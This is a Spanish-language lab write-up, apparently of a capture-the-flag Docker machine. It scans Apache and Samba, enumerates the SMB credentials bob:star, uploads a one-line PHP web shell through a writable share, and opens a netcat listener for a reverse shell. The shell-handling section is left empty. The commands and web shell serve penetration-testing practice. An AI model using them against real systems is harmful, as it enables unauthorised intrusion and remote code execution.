

# Escaneo y reconocimiento de servicios 
```ruby

 nmap -p- --min-rate 5000 -sSVC -Pn -vvv 172.17.0.2
 
Discovered open port 139/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 445/tcp on 172.17.0.2 17s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE     REASON         VERSION
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: \xC2\xBFQu\xC3\xA9 es Samba?
|_http-server-header: Apache/2.4.52 (Ubuntu)
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4
MAC Address: 02:42:AC:11:00:02 (Unknown)

Host script results:
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 21783/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 9604/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 58197/udp): CLEAN (Failed to receive data)
|   Check 4 (port 18315/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-18T00:14:24
|_  start_date: N/A
```

vemos que tenemos el puerto 80 iremos a revisar que se encuentra en este puerto 

<img width="1195" height="701" alt="image" src="https://github.com/user-attachments/assets/c1038938-3f6c-4720-8269-5117198a296e" />

vemos que nos explica un poco de samba, mas informacion --> (https://hackers-arise.com/network-basics-for-hackers-server-message-block-smb-and-samba/)

Realizamos un fuzzeo en busca de directorios, subdirectorios y subdominios interesantes pero sin éxito. 

Nos centramos en el servidor smb, lanzamos enum4linux, para una posible enumeración de usuarios 

```bash

enum4linux 172.17.0.2
------------------------------------------------------------------------------
SMB         172.17.0.2      445    0D5A72EE76E8     [+] 0D5A72EE76E8\bob:star

```
Conseguimos las credenciales para bob: bob@star
```bash
smbmap -H 172.17.0.2 -u 'bob' -p 'star'
-----------------------------------------------------------

[+] IP: 172.17.0.2:445  Name: 172.17.0.2                Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        html                                                    READ, WRITE     HTML Share
        IPC$                                                    NO ACCESS       IPC Service (0d5a72ee76e8 ser

```

Nos encontramos con que bob tiene permisos para modificar la carpeta html del servidor Apache, vamos a intentar subir un archivo PHP para realizar RCE.


Para acceder al recurso en el servidor smb usamos el comando:
```bash
smbclient //172.17.0.2/html -U bob 
Password for [WORKGROUP\bob]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Oct 17 20:46:06 2025
  ..                                  D        0  Thu Apr 11 04:18:47 2024
  index.html                          N     1832  Thu Apr 11 04:21:43 2024

                82083148 blocks of size 1024. 60066552 blocks available

```
crearemos un revershell con php 

```bash
<?php
        system($_GET['cmd']);
?>
```

<img width="1266" height="711" alt="image" src="https://github.com/user-attachments/assets/1ca8a458-75dd-48ea-8f18-c7f830085537" />


Llamamos al archivo y comprobamos que funciona correctamente

nos ponemos en escucha con nc 

```bash
nc -lnvp <port>
```

<img width="673" height="159" alt="image" src="https://github.com/user-attachments/assets/1810a5c2-5568-43e7-ba38-44ef7ec55070" />

conseguimos una revershell exitosa aprovecharemos las credenciales de bob y nos haremos su bobo

# tratamiento de tty 

```bash

```
